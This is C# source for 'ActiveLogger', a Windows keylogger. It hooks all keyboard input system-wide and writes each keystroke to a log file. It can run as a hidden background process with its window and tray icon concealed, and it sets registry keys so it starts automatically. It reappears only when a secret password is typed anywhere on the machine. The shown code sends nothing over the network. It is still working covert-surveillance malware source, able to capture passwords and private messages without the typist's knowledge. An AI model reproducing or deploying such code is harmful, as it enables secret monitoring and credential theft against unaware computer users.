/*  * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*																		*
*	Copyright (C) 2007  Ahmet BUTUN (butun180@hotmail.com)				*
*	http://www.ahmetbutun.net									        *
*																		*
*	This program is free software; you can redistribute it and/or		*
*	modify it under the terms of the GNU General Public License as		*
*	published by the Free Software Foundation; either version 2 of		*
*	the License, or (at your option) any later version.					*
*																		*
*	This program is distributed in the hope that it will be useful,		*
*	but WITHOUT ANY WARRANTY; without even the implied warranty of		*
*	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU	*
*	General Public License for more details.							*
*																		*
*	You should have received a copy of the GNU General Public License	*
*	along with this program; if not, write to the Free Software			*
*	Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.			*
*																		*
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *  */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text.RegularExpressions;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Resources;
using System.Globalization;
using System.Threading;

namespace ActiveLogger
{
    public partial class ActiveLogger : Form
    {
        /// <summary>
        /// Main ActiveLogger Hook
        /// </summary>
        private Service activeHook;

        /// <summary>
        /// Main window to hide/display to the user
        /// </summary>
        private Window activeWindow;

        /// <summary>
        /// Unpressed time checker Timer
        /// </summary>
        private Timer activeTimer;

        /// <summary>
        /// Updates the display log files content
        /// </summary>
        private Timer updateDisplay;

        /// <summary>
        /// HotKeyFilter object
        /// </summary>
        private HotKeyFilter activeHotKeys;

        /// <summary>
        /// Pressed keys are buffered in this object
        /// </summary>
        private StringBuilder bufferString = new StringBuilder(140, 140);

        /// <summary>
        /// Password is stored in this object
        /// </summary>
        private PasswordString passwordString = new PasswordString(Constants.defaultAdministratorPassword, 16, 16);

        /// <summary>
        /// Administrator password
        /// </summary>
        private string adminPassword = Constants.defaultAdministratorPassword;

        /// <summary>
        /// Indicates that we really want to exit the application
        /// </summary>
        private bool exitApplication = false;

        /// <summary>
        /// Indicates that user did not pressed any button for a long time
        /// </summary>
        private bool notPressedForALongTime = false;

        /// <summary>
        /// Indicates that wheter the program is started as background process or not
        /// </summary>
        private bool startAsBackgroundProcess = false;

        /// <summary>
        /// Log file I/O read block size
        /// </summary>
        private int readByteBlocks = 1024;

        /// <summary>
        /// Shows the current error count
        /// </summary>
        private int totalErrorCount = 0;

        /// <summary>
        /// Shows the total error count
        /// </summary>
        private int maxErrorCount = Constants.defaultMaxErrorCount;

        /// <summary>
        /// Shows current language
        /// </summary>
        private int currentLanguage = 0;

        /// <summary>
        /// Time threshold for unpressed keys period
        /// </summary>
        private int unpressedTimeThreshHold = Constants.defaultUnpressedTimeThreshHold;

        /// <summary>
        /// Capture log max size
        /// </summary>
        private long maxFileSize = Constants.defaultCaptureFileSize;
        
        /// <summary>
        /// Currently used error file length
        /// </summary>
        private long currentErrorLogFileLength = 0;

        /// <summary>
        /// Currently used capture file length
        /// </summary>
        private long currentCaptureLogFileLength = 0;

        /// <summary>
        /// Resource manager
        /// </summary>
        private ResourceManager m_ResourceManager = new ResourceManager("ActiveLogger.ActiveLogger",
                                    System.Reflection.Assembly.GetExecutingAssembly());

        private CultureInfo m_EnglishCulture = new CultureInfo("en-US");
        private CultureInfo m_TurkishCulture = new CultureInfo("tr-TR");

        public ActiveLogger(string[] args)
        {
            // check application file directories, if not exist then create
            Utilities.SafeCheckDirectory(Application.UserAppDataPath);

            // load stored settings
            Utilities.LoadSettings();

            // LANGUAGE
            if (Utilities.Settings.Contains(Constants.currentLanguage))
                currentLanguage = (int)Utilities.Settings[Constants.currentLanguage];

            if (currentLanguage == 0)
            {
                Thread.CurrentThread.CurrentCulture = m_EnglishCulture;
                Thread.CurrentThread.CurrentUICulture = m_EnglishCulture;
            }
            else
            {
                Thread.CurrentThread.CurrentCulture = m_TurkishCulture;
                Thread.CurrentThread.CurrentUICulture = m_TurkishCulture;
            }

            InitializeComponent();

            // get program arguments
            if(args.Length>0)
                this.startAsBackgroundProcess = (args[0]=="-b");

            // crate an instance with global hooks
            this.activeHook = new Service(false, true);

            // crate an instance of timer to check the long time periods of unpressed buttons
            this.activeTimer = new Timer(5,0);

            // crate an instance of timer to update the log files
            this.updateDisplay = new Timer(3, 0);

            // create a new instance of hotkeys
            this.activeHotKeys = new HotKeyFilter();
            this.activeHotKeys.Parent = this;

            //Add a WM_HOTKEY message filter
            Application.AddMessageFilter(this.activeHotKeys);

            // fill hotkey selection modifiers
            FillModifiers();

            // hang on events
            this.activeHook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            this.activeHook.KeyDown += new KeyEventHandler(HookKeyDown);
            this.activeHook.KeyPress += new KeyPressEventHandler(HookKeyPress);
            this.activeHook.KeyUp += new KeyEventHandler(HookKeyUp);

            this.activeTimer.OnTargetReached += new OnTargetReachedEventHandler(activeTimer_OnTargetReached);
            this.updateDisplay.OnTargetReached += new OnTargetReachedEventHandler(updateDisplay_OnTargetReached);

            this.passwordString.OnPasswordFound += new PasswordFoundEventHandler(passwordString_OnPasswordFound);

            this.activeHotKeys.HotKeyEvent += new HotKeyFilter.HotKeyHandler(activeHotKeys_HotKeyEvent);
        }

        #region Log Files Relates Methods

            #region Log Files Write/Append Methods

        private void AppendToCaptureLog(string current)
        {
            StreamWriter logFile = null;

            bufferString.Append(current);

            if (bufferString.Length > 64 || (notPressedForALongTime && bufferString.Length>0))
            {
                try
                {
                    // Create a file that the application will store user specific data in.
                    string filePath = Application.UserAppDataPath + "\\actcap.bin";

                    logFile = new StreamWriter(filePath, true, Encoding.Unicode);

                    if (logFile != null)
                    {
                        string encStr = "";

                        if(notPressedForALongTime)
                            encStr = Environment.NewLine + bufferString.ToString();
                        else
                            encStr = bufferString.ToString();

                        if (encStr != "")
                        {
                            logFile.Write(encStr);

                            logFile.Flush();
                        }
                    }
                    else
                    {
                        // Log the error
                        AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                                   "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                                   "Description : File [" + filePath + "] not found." + Environment.NewLine +
                                   "-----------------------------------------------------------------------" + Environment.NewLine
                        );

                        totalErrorCount++;
                    }
                }
                catch (Exception ex)
                {
                    // Log the error
                    AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                                   "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                                   "Description :" + ex.ToString() + Environment.NewLine +
                                   "-----------------------------------------------------------------------" + Environment.NewLine
                        );

                    // increment the global error count
                    totalErrorCount++;
                }

                // close the file
                if (logFile != null)
                    logFile.Close();

                // empty buffer
                bufferString.Remove(0, bufferString.Length);
            }
        }

        private void AppendErrorLog(string msg)
        {
            StreamWriter logFile = null;

            try
            {
                // Create a file that the application will store user specific data in.
                string filePath = Application.UserAppDataPath + "\\acterr.bin";

                logFile = new StreamWriter(filePath, true, Encoding.Unicode);

                if (logFile != null)
                {
                    string encStr = msg;

                    if (encStr != "")
                    {
                        logFile.Write(encStr);

                        logFile.Flush();
                    }
                }
            }
            catch (Exception ex)
            {
                if (totalErrorCount > this.maxErrorCount)
                {
                    // Log the event
                    AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                                   "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                                   "Description : Maximum error count exceeded." + Environment.NewLine +
                                   "-----------------------------------------------------------------------" + Environment.NewLine
                        );
                    
                    // indicate that the application must be closed
                    this.exitApplication = true;

                    // close the file
                    if (logFile != null)
                        logFile.Close();

                    // stop the logger
                    this.Close();
                }
            }

            // close the file
            if (logFile != null)
                logFile.Close();
        }

        #endregion

            #region Log File Mapping Methods

        private void MapCaptureLogFileToTextbox()
        {
            try
            {
                // Create a file that the application will store user specific data in.
                string filePath = Application.UserAppDataPath + "\\actcap.bin";

                if (File.Exists(filePath))
                {
                    StreamReader logFile = new StreamReader(filePath);

                    if (logFile != null)
                    {
                        Regex reg;
                        string currentContent = logFile.ReadToEnd();

                        // RETURN KEY
                        reg = new Regex("\r{1,}");
                        currentContent = reg.Replace(currentContent, Environment.NewLine);

                        // BACKSPACE KEY
                        reg = new Regex("\b");
                        currentContent = reg.Replace(currentContent, " [BACKSPACE] ");

                        this.keyLogText.Text = currentContent;

                        logFile.Close();
                    }
                }
            }
            catch (Exception ex)
            {
                // increment the global error count
                totalErrorCount++;

                // Log the error
                AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                               "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                               "Description :" + ex.ToString() + Environment.NewLine +
                               "-----------------------------------------------------------------------" + Environment.NewLine
                    );
            }
        }

        private void MapErrorLogFileToTextbox()
        {
            try
            {
                // Create a file that the application will store user specific data in.
                string filePath = Application.UserAppDataPath + "\\acterr.bin";

                if (File.Exists(filePath))
                {
                    StreamReader logFile = new StreamReader(filePath);

                    if (logFile != null)
                    {
                        // show the log to the user
                        this.errorLogText.Text = logFile.ReadToEnd();

                        logFile.Close();
                    }
                }
            }
            catch (Exception ex)
            {
                // increment the global error count
                totalErrorCount++;

                // Log the error
                AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                               "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                               "Description : An Error Occured While Reading Key File" + Environment.NewLine +
                               "-----------------------------------------------------------------------" + Environment.NewLine
                    );
            }
        }

        #endregion

        #endregion

        #region Min Form Load Event

        private void ActiveLogger_Load(object sender, EventArgs e)
        {
            // set window object
            activeWindow = new Window("Active Logger Window Hider", this.Handle, "");

            // get settings from file
            GetSettingsElements();

            // if any captured key log exists then show it
            MapCaptureLogFileToTextbox();

            // if any captured error log exists then show it
            MapErrorLogFileToTextbox();

            if (startAsBackgroundProcess)
            {
                // if argument specified start the service
                ChangeServiceStatus();

                // if argument specified sent it to the taskbar (hide the notify icon)
                SendToTaskBar();
            }
        }

        #endregion

        #region Main Methods

        private void SendToTaskBar()
        {
            if (this.activeHook.ServiceStatus == Enums.ServiceStatus.STARTED)
            {
                this.activeLogNotifyIcon.Visible = false;

                activeWindow.Visible = false;
            }
            else
            {
                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    MessageBox.Show("Servis çalýþmýyor. Lütfen öncelikle servisi baþlatýnýz!", "Uyarý", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1);
                else
                    MessageBox.Show("Logging service is not running. Please start the service first!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1);
            }
        }

        private void ChangeServiceStatus()
        {
            if (this.activeHook.ServiceStatus == Enums.ServiceStatus.STARTED)
            {
                this.activeHook.Stop();
                this.activeTimer.Stop();
                this.updateDisplay.Stop();

                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    this.serviceStatusButton.Text = "Baþlat";
                else
                    this.serviceStatusButton.Text = "Start";
                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    this.serviceStatusLabel.Text = "Servis Durduruldu";
                else
                    this.serviceStatusLabel.Text = "Service is stopped";
                this.serviceStatusPicture.BackgroundImage = global::ActiveLogger.Properties.Resources.stopped;
            }
            else
            {
                this.activeHook.Start();
                this.activeTimer.Start();
                this.updateDisplay.Start();

                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    this.serviceStatusButton.Text = "Durdur";
                else
                    this.serviceStatusButton.Text = "Stop";
                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    this.serviceStatusLabel.Text = "Servis Çalýþýyor";
                else
                    this.serviceStatusLabel.Text = "Service is running";
                this.serviceStatusPicture.BackgroundImage = global::ActiveLogger.Properties.Resources.running;
            }
        }

        private void SetSettingsElements(bool flag)
        {
            try
            {
                // MAX LOG FILE SIZE
                if (Utilities.Settings.Contains(Constants.maxCaptureFileSize))
                {
                    long tmp = Convert.ToInt64(this.maxFileSizeText.Text);

                    // shold not be greater the deafult max value
                    if (tmp > Constants.defaultMaxCaptureFileSize)
                        tmp = Constants.defaultMaxCaptureFileSize;

                    Utilities.Settings[Constants.maxCaptureFileSize] = tmp;
                }
                else
                    Utilities.Settings.Add(new SettingPropery(Constants.maxCaptureFileSize, this.maxFileSize));
            }
            catch
            {
                // NOP
            }

            try
            {
                // MAX ERROR COUNT
                if (Utilities.Settings.Contains(Constants.maxErrorCount))
                {
                    int tmp = Convert.ToInt32(this.maxErrorCountText.Text);

                    // shold not be greater the deafult max value
                    if (tmp > Constants.defaultMaxMaxErrorCount)
                        tmp = Constants.defaultMaxMaxErrorCount;

                    Utilities.Settings[Constants.maxErrorCount] = tmp;
                }
                else
                    Utilities.Settings.Add(new SettingPropery(Constants.maxErrorCount, this.maxErrorCount));
            }
            catch
            {
                // NOP
            }

            try
            {
                // UNPRESSED KEY THRESHOLD
                if (Utilities.Settings.Contains(Constants.unpressedTimeThreshHold))
                {
                    int tmp = Convert.ToInt32(this.unpressedTimeThreshHoldText.Text);

                    // shold not be greater the deafult max value
                    if (tmp > Constants.defaultMaxUnpressedTimeThreshHold)
                        tmp = Constants.defaultMaxUnpressedTimeThreshHold;
                    else if (tmp < 5)
                        tmp = 5;

                    Utilities.Settings[Constants.unpressedTimeThreshHold] = tmp;

                    // also set the current timer
                    this.activeTimer.Target = tmp;
                }
                else
                    Utilities.Settings.Add(new SettingPropery(Constants.unpressedTimeThreshHold, this.unpressedTimeThreshHold));
            }
            catch
            {
                // NOP
            }

            // ADMINISTRATOR PASSWORD
            if (Utilities.Settings.Contains(Constants.administratorPassword))
                Utilities.Settings[Constants.administratorPassword] = this.adminPasswordText.Text;
            else
                Utilities.Settings.Add(new SettingPropery(Constants.administratorPassword, this.adminPassword));

            // LANGUAGE
            if (Utilities.Settings.Contains(Constants.currentLanguage))
                Utilities.Settings[Constants.currentLanguage] = (Enums.Languages)currentLanguageCombo.SelectedIndex;
            else
                Utilities.Settings.Add(new SettingPropery(Constants.currentLanguage, Constants.defaultCurrentLanguage));

            // SHOW HIDE KEY
            if (Utilities.Settings.Contains(Constants.showHideKey))
                Utilities.Settings[Constants.showHideKey] = (KeyCodes.VirtualKey)MainCombo.SelectedItem;
            else
                Utilities.Settings.Add(new SettingPropery(Constants.showHideKey, Constants.defaultShowHideKey));

            // SHOW HIDE KEY MODIFIERS
            if (Utilities.Settings.Contains(Constants.showHideKeyModifier))
                Utilities.Settings[Constants.showHideKeyModifier] = GetCurrentKeyHideModifier();
            else
                Utilities.Settings.Add(new SettingPropery(Constants.showHideKeyModifier, Constants.defaultShowHideKeyModifier));

            if (!flag)
            {
                // re-register HotKeys
                this.activeHotKeys.ReleaseKeys();
                this.activeHotKeys.Add(new HotKey(666, GetCurrentKeyHideModifier(), (KeyCodes.VirtualKey)MainCombo.SelectedItem));
            }
        }

        private KeyCodes.Modifier GetCurrentKeyHideModifier()
        {
            KeyCodes.Modifier mods = 0;

            foreach (string modKey in ModifierList.CheckedItems)
            {
                switch (modKey)
                {
                    case "Alt":
                        mods = mods + (uint)KeyCodes.Modifier.MOD_ALT;
                        break;
                    case "Shift":
                        mods = mods + (uint)KeyCodes.Modifier.MOD_SHIFT;
                        break;
                    case "Control":
                        mods = mods + (uint)KeyCodes.Modifier.MOD_CONTROL;
                        break;
                    case "Windows Key":
                        mods = mods + (uint)KeyCodes.Modifier.MOD_WIN;
                        break;
                }
            }

            return mods;
        }

        private void SetCurrentKeyHideModifier(uint x)
        {
            while (x > 0)
            {
                if (x >= (uint)KeyCodes.Modifier.MOD_WIN)
                {
                    this.ModifierList.SetItemChecked(3, true);
                    x = x - (uint)KeyCodes.Modifier.MOD_WIN;
                }
                else if (x >= (uint)KeyCodes.Modifier.MOD_SHIFT)
                {
                    this.ModifierList.SetItemChecked(2, true);
                    x = x - (uint)KeyCodes.Modifier.MOD_SHIFT;
                }
                else if (x >= (uint)KeyCodes.Modifier.MOD_CONTROL)
                {
                    this.ModifierList.SetItemChecked(1, true);
                    x = x - (uint)KeyCodes.Modifier.MOD_CONTROL;
                }
                else if (x >= (uint)KeyCodes.Modifier.MOD_ALT)
                {
                    this.ModifierList.SetItemChecked(0, true);
                    x = x - (uint)KeyCodes.Modifier.MOD_ALT;
                }
            }
        }

        private void GetSettingsElements()
        {
            // MAX LOG FILE SIZE
            if (Utilities.Settings.Contains(Constants.maxCaptureFileSize))
                this.maxFileSize = Convert.ToInt64(Utilities.Settings[Constants.maxCaptureFileSize]);

            // MAX ERROR COUNT SIZE
            if (Utilities.Settings.Contains(Constants.maxErrorCount))
                this.maxErrorCount = Convert.ToInt32(Utilities.Settings[Constants.maxErrorCount]);

            // UNPRESSED KEY THRESHOLD
            if (Utilities.Settings.Contains(Constants.unpressedTimeThreshHold))
            {
                this.unpressedTimeThreshHold = Convert.ToInt32(Utilities.Settings[Constants.unpressedTimeThreshHold]);

                this.activeTimer.Target = this.unpressedTimeThreshHold;
            }

            // ADMINISTRATOR PASSWORD
            if (Utilities.Settings.Contains(Constants.administratorPassword))
            {
                this.adminPassword = Utilities.Settings[Constants.administratorPassword].ToString();

                this.passwordString.Password = this.adminPassword;
            }

            // LANGUAGE
            this.currentLanguageCombo.SelectedIndex = currentLanguage;

            // SHOW HIDE KEY
            if (Utilities.Settings.Contains(Constants.showHideKey))
                MainCombo.SelectedItem = (KeyCodes.VirtualKey)Utilities.Settings[Constants.showHideKey];
            else
                MainCombo.SelectedItem = Constants.defaultShowHideKey;

            // SHOW HIDE KEY MODIFIERS
            if (Utilities.Settings.Contains(Constants.showHideKeyModifier))
                SetCurrentKeyHideModifier((uint)Utilities.Settings[Constants.showHideKeyModifier]);
            else
                SetCurrentKeyHideModifier((uint)Constants.defaultShowHideKeyModifier);

            // show settings
            this.maxFileSizeText.Text = this.maxFileSize.ToString();
            this.maxErrorCountText.Text = this.maxErrorCount.ToString();
            this.adminPasswordText.Text = this.adminPassword;
            this.unpressedTimeThreshHoldText.Text = this.unpressedTimeThreshHold.ToString();

            // re-register HotKeys
            this.activeHotKeys.ReleaseKeys();
            this.activeHotKeys.Add(new HotKey(666, GetCurrentKeyHideModifier(), (KeyCodes.VirtualKey)MainCombo.SelectedItem));
        }

        private void CloseApplication(bool flag, bool restart)
        {
            SetSettingsElements(flag);

            if (flag)
            {
                // stop the hook
                if (this.activeHook.ServiceStatus == Enums.ServiceStatus.STARTED)
                    this.activeHook.Stop();

                if (this.activeTimer.TimerState != TimerState.STOPPED)
                    this.activeTimer.Stop();

                // save settings
                Utilities.SaveSettings();

                // check and create registery keys to start automatically
                if (!Utilities.CheckRegisteryKeys())
                {
                    // First try to delete
                    Utilities.DeleteRegisteryKeys();

                    // Then create the keys
                    Utilities.SetRegisteryKeys();
                }

                this.activeHotKeys.ReleaseKeys();

                // close or restart
                if(restart)
                    Application.Restart();
                else
                    Application.Exit();
            }
            else
                SendToTaskBar();
        }

        #endregion

        #region Form Inner Variable Events Related Methods

        /// <summary>
        /// HotKeyEvent handler
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="WParam">HotKey ID</param>
        void activeHotKeys_HotKeyEvent(object sender, IntPtr WParam)
        {
            switch ((int)WParam)
            {
                case 666:
                    activeWindow.Visible = !activeWindow.Visible;
                    break;
            }
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            //NOP
        }

        public void HookKeyDown(object sender, KeyEventArgs e)
        {
            //NOP
        }

        public void HookKeyPress(object sender, KeyPressEventArgs e)
        {
            try
            {
                this.activeTimer.Current = 0;

                AppendToCaptureLog(e.KeyChar.ToString());

                this.passwordString.Append(e.KeyChar.ToString());
            }
            catch (Exception ex)
            {
                // Log the error
                AppendErrorLog("Error " + totalErrorCount.ToString() + Environment.NewLine +
                               "Date :" + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString() + Environment.NewLine +
                               "Description :" + ex.ToString() + Environment.NewLine +
                               "-----------------------------------------------------------------------" + Environment.NewLine
                    );

                totalErrorCount++;
            }
        }

        public void HookKeyUp(object sender, KeyEventArgs e)
        {
            //NOP
        }

        private void activeTimer_OnTargetReached(object sender, EventArgs e)
        {
            // user did not pressed any button for a long time ( 8 seconds :) )
            notPressedForALongTime = true;

            AppendToCaptureLog("");

            notPressedForALongTime = false;
        }

        public void updateDisplay_OnTargetReached(object sender, EventArgs e)
        {
            MapCaptureLogFileToTextbox();
            MapErrorLogFileToTextbox();
        }

        public void passwordString_OnPasswordFound(object sender, EventArgs e)
        {
            this.activeLogNotifyIcon.Visible = true;
            this.activeWindow.Visible = true;
        }

        #endregion

        #region Helper Methods

        private void isPressedKeyDigit(object sender, KeyPressEventArgs e)
        {
            Regex regex = new Regex(@"\d", RegexOptions.IgnoreCase);

            if (!regex.IsMatch(e.KeyChar.ToString()))
                e.Handled = true;
        }

        #endregion

        #region Form Events Related Methods

        private void ActiveLogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!exitApplication && e.CloseReason != CloseReason.WindowsShutDown)
            {
                CloseApplication(false, false);

                e.Cancel = true;
            }
        }

        private void cancelButton_Click(object sender, EventArgs e)
        {
            CloseApplication(false, false);
        }

        private void closeAppButton_Click(object sender, EventArgs e)
        {
            this.exitApplication = true;

            CloseApplication(true, false);
        }

        private void okButton_Click(object sender, EventArgs e)
        {
            CloseApplication(false, false);
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.exitApplication = true;

            CloseApplication(true, false);
        }

        private void serviceStatusButton_Click(object sender, EventArgs e)
        {
            ChangeServiceStatus();
        }

        private void keyLogTab_Enter(object sender, EventArgs e)
        {
            MapCaptureLogFileToTextbox();
        }

        private void errorLogTab_Enter(object sender, EventArgs e)
        {
            MapErrorLogFileToTextbox();
        }

        private void keyLogSaveAsButton_Click(object sender, EventArgs e)
        {
            if (this.saveLogFileAs.ShowDialog() == DialogResult.OK)
            {
                string filePath = this.saveLogFileAs.FileName;
                string currentContent = this.keyLogText.Text;

                FileInfo f = new FileInfo(filePath);

                if (f.Extension.ToLower() == ".htm" || f.Extension.ToLower() == ".html")
                {
                    currentContent = currentContent.Replace(Environment.NewLine, "<BR>");
                    currentContent = "<HTML><HEAD></HEAD><BODY>" + currentContent + "</BODY></HTML>";
                }

                FileStream fs = f.OpenWrite();

                fs.Write(Encoding.Unicode.GetBytes(currentContent), 0, Encoding.Unicode.GetByteCount(currentContent));

                fs.Close();
            }
        }

        private void errorLogSaveAsButton_Click(object sender, EventArgs e)
        {
            if (this.saveLogFileAs.ShowDialog() == DialogResult.OK)
            {
                string filePath = this.saveLogFileAs.FileName;
                string currentContent = this.errorLogText.Text;

                FileInfo f = new FileInfo(filePath);

                if (f.Extension.ToLower() == ".htm" || f.Extension.ToLower() == ".html")
                {
                    currentContent = currentContent.Replace(Environment.NewLine, "<BR>");
                    currentContent = "<HTML><HEAD></HEAD><BODY>" + currentContent + "</BODY></HTML>";
                }

                FileStream fs = f.OpenWrite();

                fs.Write(Encoding.Unicode.GetBytes(currentContent), 0, Encoding.Unicode.GetByteCount(currentContent));

                fs.Close();
            }
        }

        private void setDefaultsButton_Click(object sender, EventArgs e)
        {
            this.maxErrorCount = Constants.defaultMaxErrorCount;
            this.maxErrorCountText.Text = Constants.defaultMaxErrorCount.ToString();

            this.maxFileSize = Constants.defaultCaptureFileSize;
            this.maxFileSizeText.Text = Constants.defaultCaptureFileSize.ToString();

            this.adminPassword = this.adminPasswordText.Text = Constants.defaultAdministratorPassword;

            this.unpressedTimeThreshHold = Constants.defaultUnpressedTimeThreshHold;
            this.unpressedTimeThreshHoldText.Text = Constants.defaultUnpressedTimeThreshHold.ToString();

            this.MainCombo.SelectedItem = KeyCodes.VirtualKey.VK_Z;

            this.currentLanguageCombo.SelectedIndex = (int)Enums.Languages.ENGLISH;

            SetCurrentKeyHideModifier(7);
        }

        private void clearKeyLogFileButton_Click(object sender, EventArgs e)
        {
            try
            {
                // Get log file
                string filePath = Application.UserAppDataPath + "\\actcap.bin";

                if (File.Exists(filePath))
                    File.Delete(filePath);

                this.keyLogText.Text = "";
            }
            catch
            {
                //NOP
            }
        }

        private void clearErrorLogFileButton_Click(object sender, EventArgs e)
        {
            try
            {
                // Get log file
                string filePath = Application.UserAppDataPath + "\\acterr.bin";

                if (File.Exists(filePath))
                    File.Delete(filePath);

                this.errorLogText.Text = "";
            }
            catch
            {
                //NOP
            }
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.activeWindow.Visible = true;

            this.Activate();
        }

        private void settingsProperties_MouseMove(object sender, MouseEventArgs e)
        {
            TextBox text = (TextBox)sender;

            // STRING LITERAL //
            if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                switch (text.Tag.ToString())
                {
                    case "1":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "ActiveLogger, basýlan tüm tuþlarý dosya sistemi üzerinde saklar. Kütük için kullanýlan dosya büyüklüðü burada belirtilen rakama ulaþýrsa, kütük için yeni bir dosya yaratýlýr.";
                        break;
                    case "2":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "ActiveLogger, kendi içerisinde burada belirtilen rakam kadar hata sayýsýna ulaþýrsa kendisini kapatacaktýr.";
                        break;
                    case "3":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "ActiveLogger kullanýcýdan gizli olarak arka planda çalýþýr. ActiveLogger'ýn yeniden görüntülenmesini saðlamak için bu þifre kullanýlýr.";
                        break;
                    case "4":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "Kullanýcý burada belirtilen süre boyunca herhangi bir tuþa basmazsa, ActiveLogger o ana kadar kaydedilmiþ tamponu kütüðe yazar.";
                        break;
                }
            else
            {
                switch (text.Tag.ToString())
                {
                    case "1":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "ActiveLogger logs the pressed keys in a file. If the current file size reaches this number, a new log file will be created.";
                        break;
                    case "2":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "Maximum error count tells the ActiveLogger to shut down the service when internal error count reaches this number.";
                        break;
                    case "3":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "This password is used to activate ActiveLogger when it is hidden. Simply type this password anywhere on the computer to call back ActiveLogger.";
                        break;
                    case "4":
                        // STRING LITERAL //
                        this.settingsDescTipLabel.Text = "If user does not press any keyboard for the specified threshold value, ActiveLogger saves the current buffer to file...";
                        break;
                }
            }
        }

        private void settingsProperties_MouseLeave(object sender, EventArgs e)
        {
            // STRING LITERAL //
            if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                this.settingsDescTipLabel.Text = "Fareyi herhangi bir ayar kutusunun üzerinde gezdirin.";
            else
                this.settingsDescTipLabel.Text = "Move mouse over a property!";
        }

        private void currentLanguageCombo_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (currentLanguageCombo.SelectedIndex != currentLanguage)
            {
                DialogResult res;

                // STRING LITERAL //
                if (Thread.CurrentThread.CurrentCulture.Equals(this.m_TurkishCulture))
                    res = MessageBox.Show("Deðiþikliklerin yansýtýlmasý için ActiveLogger yeniden baþlatýlmalý.\nActiveLogger þimdi yeniden baþlatýlsýn mý?", "ActiveLogger", MessageBoxButtons.OKCancel);
                else
                    res = MessageBox.Show("ActiveLogger must be restarted in order to changes take effect.\nWould you like to restart ActiveLogger now?", "ActiveLogger", MessageBoxButtons.OKCancel);

                if (res == DialogResult.OK)
                {
                    this.exitApplication = true;

                    CloseApplication(true, true);
                }
            }
        }

        #endregion

        #region HotKey Settings Realated

        private void ValidateModifiers(object sender, CancelEventArgs e)
        {
            if (ModifierList.CheckedItems.Count == 0)
            {
                e.Cancel = true;
                MessageBox.Show("You must select at least one Hot Key Modifier", "Hot Key Modifiers");
            }
        }

        private void FillModifiers()
        {
            this.ModifierList.Validating += new CancelEventHandler(ValidateModifiers);

            foreach (KeyCodes.VirtualKey x in KeyCodes.VirtualKey.GetValues(typeof(KeyCodes.VirtualKey)))
                MainCombo.Items.Add(x);
        }

        #endregion

        public void Application_ApplicationExit(object sender, EventArgs e)
        {
            //if (!this.innerCloseEvent)
            //{
                this.exitApplication = true;

                CloseApplication(true, false);
            //}
        }
    }
}